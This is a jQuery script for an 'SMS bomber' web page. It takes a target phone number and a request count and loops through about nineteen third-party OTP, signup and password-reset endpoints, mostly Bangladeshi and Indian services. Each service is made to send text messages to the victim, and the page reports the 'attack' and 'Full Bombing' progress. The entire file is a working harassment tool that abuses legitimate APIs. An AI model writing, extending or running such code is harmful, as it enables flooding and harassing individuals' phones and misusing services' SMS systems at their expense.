
$(document).ready(() => {

    $(document).on('click', '#send', function (e) {
        e.preventDefault();
        $('#logs').addClass('visually-hidden');
        var amount = $("#amount").val();
        var mobile = $("#mobile").val();
        if (amount > 0 && mobile.length == 11) {
            var c = 0;

            const APIS = [
                {
                    method: "POST",
                    url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-${mobile}/operator-Robi/send`,
                },
                {
                    method: 'POST',
                    url: "http://robi.api.bongobd.com/api/login/send-otp",
                    body: `msisdn=88${mobile}&operator=all`
                },
                {
                    method: 'POST',
                    url: `https://ghoori.com.bd/generate_otp_no_auth?mobileNo=${mobile}`
                },
                {
                    method: 'POST',
                    url: `http://apibeta.iqra-live.com/api/v2/sent-otp/${mobile}`,
                    headers: {
                        "x-user-channel": "apps"
                    }
                },
                {
                    method: "POST",
                    url: `https://aleshacard.com/api/register-otp?contact_no=${mobile}`
                },
                {
                    method: 'GET',
                    url: `http://45.114.85.19:8080/v3/otp/send?msisdn=88${mobile}`
                },
                {
                    method: 'GET',
                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
                },

                {
                    method: 'POST',
                    url: "http://vstg-gateway-prod-1532961163.ap-south-1.elb.amazonaws.com/notification/api/v1/send/otp/v3",
                    body: `{"mobileNumber":"88${mobile},"countryId":22}`
                },
                {
                    method: "POST",
                    url: `https://auth.jachai.com/api/v1/otp/send`,
                    body: `{"mobileNumber":"+88${mobile}`
                },
                {
                    method: "POST",
                    url: `https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88${mobile}`,
                },
                {
                    method: 'POST',
                    url: `https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88${mobile}`
                },
                {
                    url: "https://ss.binge.buzz/otp/send/login",
                    method: "POST",
                    body: `phone=${mobile}`
                },
                {
                    url: "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
                    method: "POST",
                    body: `phone=${mobile}`
                },
                {
                    url: "https://www.frotels.com/appsendsms.php",
                    method: "POST",
                    body: `phone=${mobile}`
                },
                {
                    url: "https://www.gapoon.com/userSignup",
                    method: "POST",
                    body: `phone=${mobile}`
                },
                {
                    url: "https://login.housing.com/api/v2/send-otp",
                    method: "POST",
                    body: `phone=${mobile}`
                },
                {
                    url: "https://porter.in/restservice/send_app_link_sms",
                    method: "POST",
                    body: `phone=${mobile}`
                },
                {
                    url: "https://cityflo.com/website-app-download-link-sms/",
                    method: "POST",
                    body: `phone=${mobile}`
                },
                {
                    url: "https://ajkerdeal.com/customers/resetpassword.aspx",
                    method: "POST",
                    body: `phone=${mobile}`
                },

            ];

            while (c < amount) {
                APIS.forEach(API => {
                    $.ajax(API);
                    c += 1;
                });
            }
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Attack Request Of " + amount + " SMS to " + mobile + " is Processing. Don't Close the Tab for Full Bombing..");


        } else {
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Something Wrong");
        }
    });
})